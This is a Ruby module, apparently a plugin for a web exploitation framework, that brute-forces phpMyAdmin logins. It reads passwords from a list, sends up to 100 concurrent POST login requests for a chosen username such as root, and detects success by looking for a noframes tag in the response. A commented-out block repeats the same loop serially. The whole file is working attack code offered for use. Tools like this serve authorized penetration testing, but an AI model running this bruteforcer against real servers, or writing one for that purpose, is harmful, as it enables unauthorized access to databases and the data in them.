#!/usr/bin/env ruby
# 
# Created Oct 9 2011
#

class WebXploit < WXf::WXfmod_Factory::Auxiliary

 include WXf::WXfassists::General::PooledReq
  
  def initialize
      super(
        'Name'        => 'phpMyAdmin Auth Bruteforce',
        'Version'     => '1.0',
        'Description' => %q{
          Bruteforce authentication for phpMyAdmin                 },
        'Author'      => ['John Poulin' ],
        'License'     => WXF_LICENSE

      )
   
      init_opts([
		OptString.new('DIR', [true, "Directory in which phpmyadmin resides", "phpmyadmin"]),
		OptString.new('USERNAME', [true, "Username to enumerate", "root"]),
		OptString.new('VERBOSE', [false, "Show verbose output?", false]),
		OptString.new('PASSLIST', [true, "Location of password list", ""])
      ])
  
  end
  
  def run
	# Create threadpool
	pool = Pool.pool(size: 100)

	username = datahash['USERNAME']

	# Prepare file
	fname = datahash['PASSLIST']
	file = File.new(fname, "r")

	response_action = Proc.new { |res,request_params, args |
		username = args[0]
		password = args[1]

		# Scan request for <noframes></noframes>
		# This appears in the source of a successfully authenticated session
		frames = res.body.scan(/\<noframes\>(.*?)\<\/noframes\>/m)
		
		if frames.count > 0
			print_good("#{username} : #{password}")
			break
		else
			if datahash['VERBOSE'] == "true"
				print_error("#{username} : #{password}")
			end
		end	
	}

	# Iterate over file contents
	while (password = file.gets)
		params = "pma_username=#{username}&pma_password=#{password}&server=1"
		options = {
            'method' => "POST",
            'RURL'=> rurl + "/" + datahash['DIR'] + "/index.php",
            'RPARAMS' => params,
			'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
          }

		pool.future.get(Proc.new {|opts| mech_req(opts)}, options, response_action, username, password) 

=begin
		params = "pma_username=#{username}&pma_password=#{password}&server=1"
		
		res = mech_req({
            'method' => "POST",
            'RURL'=> rurl + "/" + datahash['DIR'] + "/index.php",
            'RPARAMS' => params,
			'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
          })

		
		# Scan request for <noframes></noframes>
		# This appears in the source of a successfully authenticated session
		frames = res.body.scan(/\<noframes\>(.*?)\<\/noframes\>/m)
		
		if frames.count > 0
			print_good("#{username} : #{password}")
			break
		else
			if datahash['VERBOSE'] == "true"
				print_error("#{username} : #{password}")
			end
		end	

=end
	end
	
  end
  
end
